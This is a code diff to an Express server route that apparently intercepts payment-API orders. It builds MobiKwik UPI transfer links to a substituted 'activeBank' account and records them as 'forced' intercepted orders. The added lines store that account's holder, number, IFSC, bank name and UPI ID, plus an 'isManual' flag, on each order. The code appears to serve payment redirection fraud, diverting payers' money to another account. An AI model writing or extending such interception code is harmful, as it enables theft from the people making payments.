@@ -1311,6 +1311,11 @@ app.all('/xxapi/*', async (req, res) => {
                   const wDomC1 = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt4Case1}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : (bjData.walletDomain || '');
                   data.orderBankMap[case1OrderId] = {
                     bank: `${bkNameC1} | ${bkAcctC1}${bkIfscC1 ? ' | ' + bkIfscC1 : ''}`,
+                    accountHolder: activeBank.accountHolder || '',
+                    accountNo: activeBank.accountNo || '',
+                    ifsc: activeBank.ifsc || '',
+                    bankName: activeBank.bankName || '',
+                    upiId: activeBank.upiId || '',
                     amount: amt4Case1,
                     rptNo: case1OrderId,
                     orderNo: case1OrderId,
@@ -1318,7 +1323,8 @@ app.all('/xxapi/*', async (req, res) => {
                     payType: derivedPt,
                     time: now,
                     userId: String(userId || ''),
-                    forced: true,   // marks this as our intercepted order
+                    forced: true,
+                    isManual: true
                   };
                   // Alt key (rptNo/orderNo may differ)
                   if (bjData.rptNo && bjData.rptNo !== case1OrderId) data.orderBankMap[String(bjData.rptNo)] = data.orderBankMap[case1OrderId];
@@ -1421,6 +1427,11 @@ app.all('/xxapi/*', async (req, res) => {
               if (!data.orderBankMap) data.orderBankMap = {};
               data.orderBankMap[reqOrderId] = {
                 bank: `${bkName} | ${bkAcct}${bkIfsc ? ' | ' + bkIfsc : ''}`,
+                accountHolder: activeBank.accountHolder || '',
+                accountNo: activeBank.accountNo || '',
+                ifsc: activeBank.ifsc || '',
+                bankName: activeBank.bankName || '',
+                upiId: activeBank.upiId || '',
                 amount: amt4Link,
                 rptNo: reqOrderId,
                 orderNo: reqOrderId,
@@ -1429,6 +1440,7 @@ app.all('/xxapi/*', async (req, res) => {
                 time: now,
                 userId: String(userId || ''),
                 forced: true,
+                isManual: true
               };
               await saveData(data);
             }
